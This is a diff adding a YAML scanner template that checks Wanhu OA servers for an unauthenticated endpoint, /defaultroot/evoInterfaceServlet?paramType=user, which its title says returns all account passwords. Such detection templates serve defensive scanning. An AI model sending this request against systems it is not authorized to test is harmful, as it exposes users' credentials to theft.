@@ -1,0 +1,21 @@
+id: wanhu-evointerfaceservlet-unauth
+
+info:
+  name: 万户 OA 未授权访问获取所有账户密码
+  author: zan8in
+  severity: high
+  verified: true
+  tags: wanhu,unauth
+  created: 2024/01/07
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/evoInterfaceServlet?paramType=user
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'result:') &&
+      response.body.bcontains(b'data:') &&
+      response.body.bcontains(b'"userList":')
+expression: r0()
